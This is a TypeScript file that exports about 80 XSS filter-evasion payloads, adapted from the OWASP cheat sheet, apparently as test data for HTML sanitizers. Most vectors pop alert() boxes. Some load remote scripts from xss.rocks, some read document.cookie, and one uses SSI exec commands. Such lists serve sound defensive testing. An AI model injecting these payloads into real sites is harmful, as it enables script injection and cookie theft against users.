// SPDX-License-Identifier: CC-BY-SA-4.0
/**
 * XSS vectors from the "XSS Filter Evasion Cheat Sheet" of the OWASP Cheat Sheet Series.
 *
 * Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 * (https://github.com/OWASP/CheatSheetSeries/blob/557f7dc35c868280b4f6f7c0b46cca54cdc0e4cb/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md,
 * commit 557f7dc35c868280b4f6f7c0b46cca54cdc0e4cb, 2026-10-04; retrieved 2026-10-12)
 * Copyright (c) the OWASP Cheat Sheet Series contributors, originally based on RSnake's XSS Cheat Sheet.
 *
 * Licensed under the Creative Commons Attribution-ShareAlike 4.0 International license (CC BY-SA 4.0),
 * https://creativecommons.org/licenses/by-sa/4.0/. This file is an adaptation of the cheat sheet and is
 * distributed under the same license, separately from the Apache-2.0 code of this repository.
 *
 * Changes: the code blocks of the cheat sheet that contain markup were extracted as string literals,
 * deduplicated against the other vector files, limited to payloads that contain markup and are at most 600
 * characters long, and capped at the first 80 matching entries. Only the vector strings and their titles are
 * kept. The Markdown escapes `\<` and `\>` were removed.
 */

export const OWASP_VECTORS: readonly (readonly [name: string, payload: string])[] = [
  ["Basic XSS Test Without Filter Evasion", "<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>"],
  [
    "XSS Locator (Polyglot)",
    "javascript:/*--></title></style></textarea></script></xmp>\n<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>",
  ],
  ["Malformed A Tags", '<a onmouseover="alert(document.cookie)">xxs link</a>'],
  ["Malformed A Tags", "<a onmouseover=alert(document.cookie)>xxs link</a>"],
  ["Malformed IMG Tags", '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'],
  ["fromCharCode", '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>'],
  ["Default SRC Tag to Get Past Filters that Check SRC Domain", "<IMG SRC=# onmouseover=\"alert('xxs')\">"],
  ["Default SRC Tag by Leaving it Empty", "<IMG SRC= onmouseover=\"alert('xxs')\">"],
  ["Default SRC Tag by Leaving it out Entirely", "<IMG onmouseover=\"alert('xxs')\">"],
  ["On Error Alert", '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'],
  [
    "IMG onerror and JavaScript Alert Encode",
    '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  ],
  [
    "Decimal HTML Character References",
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>',
  ],
  [
    "Decimal HTML Character References Without Trailing Semicolons",
    '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>',
  ],
  [
    "Hexadecimal HTML Character References Without Trailing Semicolons",
    '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>',
  ],
  ["Embedded Tab", "<a href=\"jav\tascript:alert('XSS');\">Click Me</a>"],
  ["Embedded Encoded Tab", "<a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>"],
  ["Embedded Newline to Break Up XSS", "<a href=\"jav&#x0A;ascript:alert('XSS');\">Click Me</a>"],
  [
    "Example 1: Break Up XSS Attack with Embedded Carriage Return",
    "<a href=\"jav&#x0D;ascript:alert('XSS');\">Click Me</a>",
  ],
  [
    "Example 2: Break Up JavaScript Directive with Null",
    'perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out',
  ],
  [
    "Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS",
    "<a href=\" &#14;  javascript:alert('XSS');\">Click Me</a>",
  ],
  ["Example 4: Non-alpha-non-digit XSS", '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>'],
  ["Example 4: Non-alpha-non-digit XSS", '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>'],
  ["Example 4: Non-alpha-non-digit XSS", '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>'],
  ["Extraneous Open Brackets", '<<SCRIPT>alert("XSS");//<</SCRIPT>'],
  ["No Closing Script Tags", "<SCRIPT SRC=http://xss.rocks/xss.js?< B >"],
  ["Protocol Resolution in Script Tags", "<SCRIPT SRC=//xss.rocks/.j>"],
  ["Half Open HTML/JavaScript XSS Vector", "<IMG SRC=\"`<javascript:alert>`('XSS')\""],
  ["Escaping JavaScript Escapes", "</script><script>alert('XSS');</script>"],
  ["End Title Tag", '</TITLE><SCRIPT>alert("XSS");</SCRIPT>'],
  ["INPUT Image", '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">'],
  ["BODY Image", "<BODY BACKGROUND=\"javascript:alert('XSS')\">"],
  ["IMG Dynsrc", "<IMG DYNSRC=\"javascript:alert('XSS')\">"],
  ["IMG Lowsrc", "<IMG LOWSRC=\"javascript:alert('XSS')\">"],
  ["List-style-image", "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>"],
  ["VBscript in an Image", "<IMG SRC='vbscript:msgbox(\"XSS\")'>"],
  ["SVG Object Tag", "<svg/onload=alert('XSS')>"],
  ["BODY Tag", "<BODY ONLOAD=alert('XSS')>"],
  ["BGSOUND", "<BGSOUND SRC=\"javascript:alert('XSS');\">"],
  ["& JavaScript includes", "<BR SIZE=\"&{alert('XSS')}\">"],
  ["STYLE sheet", '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">'],
  ["Remote style sheet", '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">'],
  ["Remote style sheet part 2", "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>"],
  ["Remote style sheet part 3", '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>'],
  ["STYLE Tags that Breaks Up JavaScript for XSS", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"],
  ["STYLE Attribute that Breaks Up an Expression", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">"],
  ["IMG STYLE with Expressions", 'exp/*<A STYLE=\'no\\xss:noxss("*//*");\nxss:ex/*XSS*//*/*/pression(alert("XSS"))\'>'],
  [
    "STYLE Tag using Background-image",
    "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
  ],
  [
    "STYLE Tag using Background",
    '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>\n<STYLE type="text/css">BODY{background:url("<javascript:alert>(\'XSS\')")}</STYLE>',
  ],
  ["Anonymous HTML with STYLE Attribute", "<XSS STYLE=\"xss:expression(alert('XSS'))\">"],
  ["Local htc File", '<XSS STYLE="behavior: url(xss.htc);">'],
  ["META", '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">'],
  [
    "META using Data",
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
  ],
  [
    "META with Additional URL Parameter",
    '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
  ],
  ["IFRAME", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"],
  ["IFRAME Event Based", '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>'],
  ["FRAME", "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>"],
  ["TABLE", "<TABLE BACKGROUND=\"javascript:alert('XSS')\">"],
  ["TD", "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">"],
  ["DIV Background-image", "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"],
  [
    "DIV Background-image with Unicode XSS Exploit",
    "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
  ],
  [
    "DIV Background-image Plus Extra Characters",
    "<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">",
  ],
  ["DIV Expression", "<DIV STYLE=\"width: expression(alert('XSS'));\">"],
  ["Downlevel-Hidden Block", "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->"],
  ["BASE Tag", "<BASE HREF=\"javascript:alert('XSS');//\">"],
  ["OBJECT Tag", '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'],
  [
    "EMBED SVG Which Contains XSS Vector",
    '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  ],
  [
    "XML Data Island with CDATA Obfuscation",
    '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>\n<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
  ],
  [
    "Locally hosted XML with embedded JavaScript that is generated using an XML data island",
    '<XML SRC="xsstest.xml" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
  ],
  [
    "HTML+TIME in XML",
    '<HTML><BODY>\n<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">\n<?import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">\n</BODY></HTML>',
  ],
  [
    "Assuming you can only fit in a few characters and it filters against `.js`",
    '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>',
  ],
  [
    "SSI (Server Side Includes)",
    "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->",
  ],
  ["PHP", "<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>"],
  ["IMG Embedded Commands", '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">'],
  ["Cookie Manipulation", '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
  ["XSS Using HTML Quote Encapsulation", '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>'],
];
